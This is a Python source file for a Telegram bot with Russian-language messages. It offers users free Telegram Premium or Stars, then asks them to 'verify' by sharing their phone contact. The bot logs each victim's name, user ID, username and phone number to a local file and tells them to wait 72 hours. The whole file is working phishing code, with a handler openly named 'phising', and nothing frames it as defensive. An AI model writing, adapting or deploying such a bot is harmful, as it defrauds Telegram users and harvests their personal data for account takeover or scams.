import time
import datetime
from telebot import TeleBot, types

bot = TeleBot("токен бота тг")
print("Code by yawix93 =)")

@bot.message_handler(commands=["start"])
def start(message):
    bot.send_message(
        message.chat.id,
        "Привет!👋 Хочешь получить бесплатный Телеграм премиум или звезды? Тогда ты попал куда нужно!"
    )
    mt(message)

def mt(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton("ТГ Премиум"), types.KeyboardButton("Звезды"))
    bot.send_message(message.chat.id, "Выбери, что ты желаешь:", reply_markup=markup)
    bot.register_next_step_handler(message, mtehd)

def mtehd(message):
    if message.text == "Звезды":
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add(
            types.KeyboardButton("15 Stars"),
            types.KeyboardButton("150 Stars"),
            types.KeyboardButton("200 Stars"),
            types.KeyboardButton("250 Stars"),
            types.KeyboardButton("100000 Stars")
        )
        bot.send_message(message.chat.id, "Выбери количество звезд:", reply_markup=markup)
        bot.register_next_step_handler(message, phising)
    elif message.text == "ТГ Премиум":
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add(types.KeyboardButton("3 Месяца"), types.KeyboardButton("1 Месяц"))
        bot.send_message(message.chat.id, "Выберите, на сколько вы хотите Телеграм Премиум:", reply_markup=markup)
        bot.register_next_step_handler(message, phising)
    else:
        bot.send_message(message.chat.id, "Пожалуйста, выберите из предложенных вариантов.")
        mt(message)

def phising(message):
    typpe = message.text
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    bt_phone = types.KeyboardButton(text="Подтвердить номер телефона", request_contact=True)
    markup.add(bt_phone)
    bot.send_message(
        message.chat.id,
        f"Чтобы получить {typpe}, пройдите верификацию ниже:",
        reply_markup=markup
    )

@bot.message_handler(content_types=["contact"])
def wr(message):
    if message.contact is not None:
        info = f"""
        Данные:
        Имя: {message.contact.first_name} {message.contact.last_name or ""}
        ID: {message.contact.user_id}
        Ник: @{message.from_user.username or "Нет ника"}
        Номер телефона: {message.contact.phone_number}
        """
        current_time = datetime.datetime.now()
        formatted_time = current_time.strftime("[%d.%m.%Y %H:%M:%S] ")
        datawr = formatted_time + info + "\n"
        
        with open("data_bot.txt", "a", encoding="utf-8") as dataa:
            dataa.write(datawr)
        print(datawr)
        bot.send_message(message.chat.id, "Ожидайте 72ч ")

bot.polling()
